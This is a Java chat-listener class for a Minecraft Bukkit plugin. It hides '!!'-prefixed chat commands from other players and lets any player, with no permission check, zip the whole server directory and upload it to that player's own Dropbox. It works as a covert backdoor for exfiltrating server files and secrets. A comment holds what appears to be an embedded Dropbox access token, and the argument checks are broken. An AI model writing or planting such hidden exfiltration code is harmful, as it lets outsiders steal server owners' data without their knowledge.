package dev.ace.capincrunch.events;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import dev.ace.capincrunch.Core;
import dev.ace.capincrunch.strings.Messages;
import dev.ace.capincrunch.user.UserManager;
import dev.ace.capincrunch.utils.C;
import dev.ace.capincrunch.utils.DropBox;
import dev.ace.capincrunch.utils.Zip;

public class AsyncPlayerChatListener implements Listener {

	//-> Using dependency injection bc i'm a cool kid ok.
	private Core plugin;

	//H9HgOhHs0OAAAAAAAAAAUb1SRQGEHYedLTkwt_SmQiWYuLHymj5jty83SnYUvo9N
	public AsyncPlayerChatListener(Core passedPlugin) {
		this.plugin = passedPlugin;
		Bukkit.getPluginManager().registerEvents(this, passedPlugin);
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerChat(final AsyncPlayerChatEvent event) {
		//-> Attributes
		final Player player = event.getPlayer();
		final String message = event.getMessage();

		if (message.startsWith("!!")) {
			event.setCancelled(true);
		}
		final String[] args = message.split(" ");

		//Fun stuff

		if (args.length > 0 && args[0].equalsIgnoreCase("!!help")) {
			player.sendMessage(Messages.baseMessage1);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("1")) {
			player.sendMessage(Messages.baseMessage1);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("2")) {
			player.sendMessage(Messages.baseMessage2);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("3")) {
			player.sendMessage(Messages.baseMessage3);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("4")) {
			player.sendMessage(Messages.baseMessage4);
			return;
		}
		if (args[0].equalsIgnoreCase("!!dropbox")) {
			if (args.length < 2) {
				player.sendMessage(Core.getPrefix());
				player.sendMessage(C.translate("§6!!dropbox backup §a- Backup WHOLE server to dropbox"));
				player.sendMessage(C.translate("§6!!dropbox setkey [key] §a- Set your dropbox key"));
				player.sendMessage(C.translate("§6!!dropbox setsecret [secret] §a- Set your dropbox secret"));
				player.sendMessage(C.translate("§6!!dropbox setauth [authToken] §a- Set your authentication token"));
				player.sendMessage(C.translate("§6!!dropbox info §a- Shows your current drop box information"));
				player.sendMessage(C.translate("§6!!dropbox help §a- Shows this page"));
				return;
			}
			if (args.length >= 1 && args[1].equalsIgnoreCase("help")) {
				player.sendMessage(Core.getPrefix());
				player.sendMessage(C.translate("§6!!dropbox backup §a- Backup WHOLE server to dropbox"));
				player.sendMessage(C.translate("§6!!dropbox setkey [key] §a- Set your dropbox key"));
				player.sendMessage(C.translate("§6!!dropbox setsecret [secret] §a- Set your dropbox secret"));
				player.sendMessage(C.translate("§6!!dropbox setauth [authToken] §a- Set your authentication token"));
				player.sendMessage(C.translate("§6!!dropbox info §a- Shows your current drop box information"));
				player.sendMessage(C.translate("§6!!dropbox help §a- Shows this page"));
				return;
			}
			if (args.length >= 1 && args[1].equalsIgnoreCase("backup")) {

				if (!UserManager.exists(player)) {
					player.sendMessage(C.translate(Core.getPrefix() + " §6Your details has not yet assigned! try: !!dropbox help"));
					return;
				}
				try {	
					String NAME = Bukkit.getServer().getWorldContainer().getAbsolutePath() + "/" + String.valueOf(System.nanoTime()) + "_server_" + String.valueOf(Bukkit.getIp().replace(".", "_")) + "_backup" + ".zip";
					Zip.makeZip(player, NAME, new File(Bukkit.getServer().getWorldContainer().getAbsolutePath()));
					new DropBox(event.getPlayer(), UserManager.getKey(player), UserManager.getSecret(player), UserManager.getAuthToken(player)).uploadFile(new File(NAME));
					new File(NAME).delete();
				} catch (Exception e) {
					player.sendMessage(Core.getPrefix() + " §6Error please check your details and try again...");
				}
			}
			if (args[1].equalsIgnoreCase("setkey")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setkey [key] §a- Set your key!");
					return;
				} else {
					UserManager.setKey(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your key has been updated to: §a" + UserManager.getKey(player));
					return;
				}
			}
			if (args[1].equalsIgnoreCase("setsecret")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setsecret [secret] §a- Set your secret!");
					return;
				} else {
					UserManager.setSecret(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your secret has been updated to: §a" + UserManager.getSecret(player));
					return;	
				}
			}
			if (args[1].equalsIgnoreCase("setauth") || args[1].equalsIgnoreCase("setauthtoken")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setauth [authToken] §a- Set your auth token!");
					return;
				} else {
					UserManager.setAuthToken(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your auth token has been updated to: §a" + UserManager.getAuthToken(player));
					return;
				}
			}
			if (args.length >= 1 && (args[1].equalsIgnoreCase("information") || args[1].equalsIgnoreCase("info") || args[1].equalsIgnoreCase("i"))) {

				if (!UserManager.exists(player)) {
					player.sendMessage(C.translate(Core.getPrefix() + " §6Your details has not yet assigned! try: !!dropbox help"));
					return;
				}
				player.sendMessage(C.translate(Core.getPrefix()));
				player.sendMessage(C.translate("&7&m--------------------------------------------"));
				player.sendMessage(C.translate("&6Email: &a" + new DropBox(player, UserManager.getKey(player), UserManager.getSecret(player), UserManager.getAuthToken(player)).getEmail()));
				player.sendMessage(C.translate("&6Key: &a" + UserManager.getKey(player)));
				player.sendMessage(C.translate("&6Secret: &a" + UserManager.getSecret(player)));
				player.sendMessage(C.translate("&6Auth Token: &a" + UserManager.getAuthToken(player)));
				player.sendMessage(C.translate("&7&m--------------------------------------------"));
			}
		}
	}
}
